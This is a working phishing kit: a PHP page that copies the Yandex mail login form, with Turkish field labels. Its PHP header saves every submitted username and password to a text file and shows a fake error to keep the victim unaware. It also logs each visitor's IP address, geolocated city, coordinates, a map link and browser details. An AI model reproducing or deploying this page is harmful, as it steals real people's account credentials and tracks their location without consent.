<?php  

if (isset($_POST['login']) && isset($_POST['password'])) {

$ac = fopen("kayit.txt","a+");
$username = $_POST['login'];
$password = $_POST['password'];
$userlar = ("\n Username : ".$username."\n Password : ".$password."\n__________________ \n");
fwrite($ac,$userlar);
fclose($ac);
echo "<script>alert('Kullanıcı Adınızı veya Şifrenizi kontrol ediniz!');</script>";
}
else{
date_default_timezone_set('Europe/Istanbul');

function GetIP(){
 if(getenv("HTTP_CLIENT_IP")) {
 $ip = getenv("HTTP_CLIENT_IP");
 } elseif(getenv("HTTP_X_FORWARDED_FOR")) {
 $ip = getenv("HTTP_X_FORWARDED_FOR");
 if (strstr($ip, ',')) {
 $tmp = explode (',', $ip);
 $ip = trim($tmp[0]);
 }
 } else {
 $ip = getenv("REMOTE_ADDR");
 }
 return $ip;
}

$ip = $_SERVER["REMOTE_ADDR"];


$tarih =" Tarih : ".date('d/m/Y  H:i');

$Geo_Plugin_XML = simplexml_load_file("http://www.geoplugin.net/xml.gp?ip=".$ip); 
$adress = $Geo_Plugin_XML->geoplugin_request; 
$ulke = $Geo_Plugin_XML->geoplugin_countryName;
$bolge = $Geo_Plugin_XML->geoplugin_region;
$kita = $Geo_Plugin_XML->geoplugin_continentCode;
$ulkekodu = $Geo_Plugin_XML->geoplugin_countryCode;
$sehir = $Geo_Plugin_XML->geoplugin_city;
$plaka = $Geo_Plugin_XML->geoplugin_regionCode;
$enlem = $Geo_Plugin_XML->geoplugin_latitude;
$boylam = $Geo_Plugin_XML->geoplugin_longitude;
$tarayici = $_SERVER['HTTP_USER_AGENT']; 

$maps = "https://www.google.com/maps/place/".$enlem.",".$boylam."/@".$enlem.",".$boylam.",16z";
$yamanefkar["0"] = " Ip Adresi : ".$adress;
$yamanefkar["1"] = " Ulke : ".$ulke; 
$yamanefkar["2"] = " Bolge : ".$bolge;
$yamanefkar["3"] = " Kita : ".$kita;
$yamanefkar["4"] = " Ulke Kodu : ".$ulkekodu;
$yamanefkar["5"] = " Sehir : ".$sehir;
$yamanefkar["6"] = " Plaka : ".$plaka;
$yamanefkar["7"] = " Enlem : ".$enlem;
$yamanefkar["8"] = " Boylam : ".$boylam;
$yamanefkar["9"] = " Google Maps : ".$maps;
$yamanefkar["10"] = " Tarayıcı : ".$tarayici; 


$ac = fopen("kayit.txt","a+");

$userlar = ("\n __________________ \n".$tarih."\n".$yamanefkar["0"]."\n".$yamanefkar["1"]."\n".$yamanefkar["2"]."\n".$yamanefkar["3"]."\n".$yamanefkar["4"]."\n".$yamanefkar["5"]."\n".$yamanefkar["6"]."\n".$yamanefkar["7"]."\n".$yamanefkar["8"]."\n".$yamanefkar["9"]."\n".$yamanefkar["10"]."\n\n!--VERİLER--!\n");
fwrite($ac,$userlar);
fclose($ac);
sleep(2);




}

 ?>

<html lang="en" data-page-type="auth.new" class="is-js_yes passport-Page passport-Page_dark is-inlinesvg_yes"><head><meta charset="utf-8"><meta http-equiv="X-UA-Compatible" content="IE=EmulateIE7,IE=edge"><link rel="shortcut icon" href="//yastatic.net/morda-logo/i/favicon_comtr.ico"><script nonce="">(function(d, e, c, r, n, w, v, f) {e = d.documentElement; c = "className"; r = "replace"; n = "createElementNS"; f = "firstChild"; w = "http://www.w3.org/2000/svg"; v = d.createElement("div"); v.innerHTML = "<svg/>"; e[c] = e[c][r]("is-js_no", "is-js_yes"); e[c] += " is-inlinesvg_" + ((v[f] && v[f].namespaceURI) === w ? "yes" : "no"); })(document);</script><title>Login</title><!--[if gt IE 8]><!--><link rel="stylesheet" type="text/css" href="https://yastatic.net/passport-frontend/0.2.92-15/public/css/auth.new.css"><!-- <![endif]--><!--[if lt IE 9]><link rel="stylesheet" type="text/css" href="https://yastatic.net/passport-frontend/0.2.92-15/public/css/auth.new.ie.css"/><![endif]--><script nonce="">var uid = null;var login = null;var passportHost = "passport.yandex.com";</script><!--[if IE]><script src="//yastatic.net/jquery/1.9.1/jquery.min.js"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.92-15/public/js/vendor.js"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.92-15/public/js/auth.new.react.en.js"></script><![endif]--><!--[if !IE]><!--><script src="//yastatic.net/jquery/1.9.1/jquery.min.js" defer="defer"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.92-15/public/js/vendor.js" defer="defer"></script><script crossorigin="anonymous" src="https://yastatic.net/passport-frontend/0.2.92-15/public/js/auth.new.react.en.js" defer="defer"></script><!-- <![endif]--><script type="text/javascript" nonce="">!function(i,t){function e(){Ya.Rum.vsChanged=!0,document.removeEventListener("visibilitychange",e)}if(i.Ya=i.Ya||{},Ya.Rum)throw new Error("Rum: interface is already defined");var n=i.performance,s=n&&n.timing&&n.timing.navigationStart||Ya.startPageLoad||+new Date,a=i.requestAnimationFrame;Ya.Rum={enabled:!!n,vsStart:document.visibilityState,vsChanged:!1,_defTimes:[],_defRes:[],_deltaMarks:{},_settings:{},_vars:{},init:function(i,t){this._settings=i,this._vars=t},getTime:n&&n.now?function(){return n.now()}:function(){return Date.now()-s},time:function(i){this._deltaMarks[i]=[this.getTime()]},timeEnd:function(i){var t=this._deltaMarks[i];t&&0!==t.length&&t.push(this.getTime())},sendTimeMark:function(i,t,e,n){void 0===t&&(t=this.getTime()),this._defTimes.push([i,t,n]),this.mark(i,t)},sendResTiming:function(i,t){this._defRes.push([i,t])},sendRaf:function(i){if(a&&!this.isVisibilityChanged()){var t=this,e="2616."+i;a(function(){t.isVisibilityChanged()||(t.sendTimeMark(e+".205"),a(function(){t.isVisibilityChanged()||t.sendTimeMark(e+".1928")}))})}},isVisibilityChanged:function(){return this.vsStart&&("visible"!==this.vsStart||this.vsChanged)},mark:n&&n.mark?function(i,t){n.mark(i+(t?": "+t:""))}:function(){}},Date.now||(Ya.Rum.getTime=function(){return new Date-s}),document.addEventListener&&document.addEventListener("visibilitychange",e)}(window);
!function(){"use strict";if(window.PerformanceLongTaskTiming){var e=Ya.Rum._tti={events:[],observer:new PerformanceObserver(function(n){e.events=e.events.concat(n.getEntries()),e.events.length>100&&e.events.shift()})};e.observer.observe({entryTypes:["longtask"]})}}();
Ya.Rum.init({beacon:true,clck:'https://yandex.ru/clck/click',slots:["72792,0,21","69312,0,55","68032,0,7","61684,0,24","45271,0,83","40749,0,37"],reqid:'9cc02d50d410ab9233be5eaba81bea72'},{'287':'11508','143':'28.1207.2243'});</script><script src="https://yastatic.net/nearest.js" async="" crossorigin=""></script></head><body class="passport-Page-Body-h" data-uid="null" data-login="null" data-passporthost="&quot;passport.yandex.com&quot;" data-static-url="https://yastatic.net/passport-frontend/0.2.92-15/public/" data-logger-token="dec2ae99d54bd16990a73556e361d0fc" data-csrf="4004f0127f686d185a4a5803f2734b8186701712:1535560766629" data-metrics-id="784657" data-tld="com" data-locale="en"><div id="root"><div class="passport-Page-Body" data-reactroot="" data-reactid="1" data-react-checksum="-819417162"><div class="passport-Page-Background passport-Page-Background_10" data-reactid="2"></div><span class="passport-Page-Helper" data-reactid="3"></span><div class="passport-Page-Content" data-reactid="4"><div class="passport-Domik passport-Domik_mode_addingAccount" data-reactid="5"><h1 class="passport-Logo" data-reactid="6"><a href="https://yandex.com" data-reactid="7"><span class="passport-Icon passport-Icon_yandex_en" data-reactid="8"></span></a></h1><div class="passport-Domik-Form-Error" data-reactid="9"></div><div class="passport-ScreenBox passport-Domik-Content passport-Domik-Content_wide" data-reactid="10"><div class="passport-ScreenBox-Content" data-reactid="11"><div class="passport-ScreenBox-Item" data-reactid="12"><div class="passport-ScreenBox-Item-Content" data-reactid="13"><div class="passport-Domik-Content" data-reactid="14"></div></div></div><div class="passport-ScreenBox-Item passport-ScreenBox-Item_current" data-reactid="15"><div class="passport-ScreenBox-Item-Content" data-reactid="16"><div class="passport-Domik-Content" data-reactid="17">




  <form method="post" class="passport-Domik-Form" data-reactid="18"><input type="hidden" name="real_retpath" value="https://mail.yandex.com/" data-reactid="19"><input type="hidden" name="from" value="mail" data-reactid="20"><input type="hidden" name="fretpath" data-reactid="21" value=""><input type="hidden" name="clean" data-reactid="22" value=""><input type="hidden" name="idkey" value="101bdd6459d80bd4f6ba48bd539407c35d" data-reactid="23"><input type="hidden" name="extended" value="1" data-reactid="24"><input type="hidden" name="csrf_token" value="9a7d63e4ee046e91b80daf39c46c3b55f143d633:1535560766619" data-reactid="25"><input type="hidden" name="one" value="1" data-reactid="26"><input type="hidden" name="retpath" value="https://passport.yandex.com/auth/login-status_v2.html?method=password" data-reactid="27"><div class="passport-Domik-Form-Field" data-reactid="28"><label class="passport-Input" data-reactid="29"><input type="text" name="login" autocorrect="off" autocapitalize="off" autocomplete="username" placeholder=" " class="passport-Input-Controller" data-reactid="30"><span class="passport-Input-View" data-reactid="31"><span class="passport-Input-Label" data-reactid="32">Kullanıcı adı veya Telefon Numası</span></span></label></div><div class="passport-Domik-Form-Field" data-reactid="33"><label class="passport-Input" data-reactid="34"><input type="password" class="passport-Input-Controller" name="password" autocorrect="off" autocapitalize="off" autocomplete="current-password" placeholder=" " data-reactid="35"><span class="passport-Input-View" data-reactid="36"><span class="passport-Input-Label" data-reactid="37">Şifre</span></span></label></div><div class="passport-Domik-Form-Field" data-reactid="38"><label class="passport-Checkbox" data-reactid="39"><input type="checkbox" name="twoweeks" value="no" class="passport-Checkbox-Controller" data-reactid="40"><span class="passport-Checkbox-View" data-reactid="41"></span><span class="passport-Checkbox-Label" data-reactid="42">Don't remember me</span></label></div><div class="passport-Domik-Form-Field" data-reactid="43"><button type="submit" class="passport-Button" data-reactid="44"><span class="passport-Button-Content" data-reactid="45"><span class="passport-Button-Text" data-reactid="46">Sign in</span></span></button><button type="button" class="passport-Button passport-Button_qr" data-reactid="47"><span class="passport-Button-Content" data-reactid="48"></span></button></div></form><div data-reactid="49"><h3 class="passport-Domik-Title" data-reactid="50">Or&nbsp;sign in&nbsp;with a&nbsp;social network</h3><ul class="passport-Domik-SocialNetworks" data-reactid="51"><li data-metrics="Начало соцавторизации: fb" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_fb" data-reactid="52"><span class="passport-Icon passport-Icon_social_fb" data-reactid="53"></span></li><li data-metrics="Начало соцавторизации: gg" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_gg" data-reactid="54"><span class="passport-Icon passport-Icon_social_gg" data-reactid="55"></span></li><li data-metrics="Начало соцавторизации: tw" class="passport-Domik-SocialNetworks-Item passport-Domik-SocialNetworks-Item_tw" data-reactid="56"><span class="passport-Icon passport-Icon_social_tw" data-reactid="57"></span></li></ul></div></div></div></div><div class="passport-ScreenBox-Item" data-reactid="58"><div class="passport-ScreenBox-Item-Content" data-reactid="59"><div class="passport-Domik-Content" data-reactid="60"></div></div></div></div><ul class="passport-Domik-Footer" data-reactid="61"><li class="passport-Domik-Footer-Item" data-reactid="62"><a data-metrics="Клик на восстановление" href="https://passport.yandex.com/restoration?from=mail&amp;origin=hostroot_homer_auth_com&amp;retpath=https%3A%2F%2Fmail.yandex.com%2F" class="passport-Domik-Link passport-Domik-Footer-Link" data-reactid="63">Can't sign&nbsp;in?</a></li><li class="passport-Domik-Footer-Item" data-reactid="64"><a data-metrics="Клик на регистрацию" href="https://passport.yandex.com/registration?from=mail&amp;origin=hostroot_homer_auth_com&amp;retpath=https%3A%2F%2Fmail.yandex.com%2F" class="passport-Domik-Link passport-Domik-Footer-Link" data-reactid="65">Registration</a></li></ul></div></div><div class="passport-Domik-Retpath" data-reactid="66"><a data-metrics="Клик на Вернуться на сервис" href="https://mail.yandex.com?noretpath=1" data-reactid="67">Return to&nbsp;service</a></div><iframe class="passport-Domik-Iframe" name="iframe" src="about:blank" data-reactid="68"></iframe></div><footer class="passport-Page-Footer" data-reactid="69"><div class="footer" data-reactid="70"><span class="footer-item" data-reactid="71"><a class="link link_theme_normal" target="_blank" href="https://yandex.com/support/passport/" tabindex="0" data-reactid="72"><span class="link__inner" data-reactid="73"><!-- react-text: 74 -->Help<!-- /react-text --></span></a></span><span class="footer-item footer-item__rights" data-reactid="75"><!-- react-text: 76 -->© 2019, <!-- /react-text --><a class="link link_theme_normal" href="//yandex.com" tabindex="0" data-reactid="77"><span class="link__inner" data-reactid="78"><!-- react-text: 79 -->Yandex<!-- /react-text --></span></a></span></div></footer></div></div><noscript><div><img src="//mc.yandex.ru/watch/784657" style="position:absolute; left:-9999px;" alt=""/></div></noscript></body></html>